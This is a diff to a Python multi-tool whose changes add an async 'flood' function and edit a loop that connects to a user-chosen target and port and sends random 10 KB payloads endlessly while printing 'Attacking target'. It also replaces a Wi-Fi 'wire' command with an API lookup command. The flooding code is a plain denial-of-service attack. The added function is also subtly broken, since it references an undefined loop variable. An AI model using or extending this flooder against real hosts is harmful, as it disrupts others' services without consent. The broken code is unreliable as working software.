@@ -129,7 +129,7 @@ def get_fuels():
     return map
 
 
-def run_fuel(command_name: str, directory: str, args: list[str]):
+def run_fuel(command_name: str, args: list[str]):
     activity_start = time.time()
     args = args
     update_status("Running FUEL \"" + command_name + "\"")
@@ -155,6 +155,12 @@ def run_fuel(command_name: str, directory: str, args: list[str]):
             else:
                 print(prefix("ERROR") + "No FUEL main class found!")
     print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
+
+
+async def flood(thread: int):
+    sock.send(random.randbytes(10240))
+    string = prefix() + str(thread) + " Attacking target: " + BLUE + target + GRAY + ":" + BLUE + str(port) + RESET + "..." + GRAY + " - " + RESET + "Attack: " + BLUE + str(i + 1) + GRAY
+    print(string)
 
 
 def format_boolean(boolean: bool):
@@ -444,8 +450,8 @@ try:
                     sock.connect((target, port))
                     for i in range(sys.maxsize):
                         try:
-                            sock.send(random.randbytes(10240))
-                            print(prefix() + "Attacking target: " + BLUE + target + GRAY + ":" + BLUE + str(port) + RESET + "..." + GRAY + " - " + RESET + "Attack: " + BLUE + str(i + 1) + GRAY, end="\r")
+                            sock.send(random.randbytes(1024)*10)
+                            print(prefix() + "")
                         except socket.error:
                             print()
                             print(prefix("WARN") + "Request " + BLUE + str(i) + RESET + " failed.", end="\r")
@@ -503,44 +509,15 @@ try:
                 print(prefix() + "Stopping network sniffer...")
                 print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
 
-            case "wire":
-                if len(args) < 1:
+            case "api":
+                if len(args) < 2:
                     print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                     continue
-                action = args[0]
-                update_status("Running WIRE")
-
-                activity_start = time.time()
-
-                if action == "start":
-                    print(prefix() + "Starting WIRE service...")
-                    if not wire_started:
-                        if exec_code("netsh wlan show drivers") == 1:
-                            wire_started = False
-                            print(prefix("ERROR") + "WIRE can't be executed on your device.")
-                        else:
-                            wire_started = True
-                            print(prefix() + "WIRE service started successfully!")
-                    else:
-                        wire_started = False
-                        print(prefix("ERROR") + "WIRE service is already running!")
-                        print(prefix("ERROR") + "You can restart it using \"wire restart\".")
-                elif action == "connect":
-                    if len(args) < 2:
-                        print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
-                        continue
-                    if not wire_started:
-                        print(prefix("ERROR") + "WIRE service isn't running!")
-                        continue
-                    target = args[1]
-                    execute("netsh wlan connect name=" + target)
-                elif action == "stop":
-                    if not wire_started:
-                        wire_started = True
-                        print(prefix("ERROR") + "WIRE service isn't running!")
-                    else:
-                        wire_started = False
-                        print(prefix() + "WIRE service stopped successfully!")
+                path = args[0]
+                key = args[1]
+                if key.isdigit():
+                    key = int(key)
+                print(api_request(path).json()[key])
 
             case "resolve":
                 if len(args) < 2:
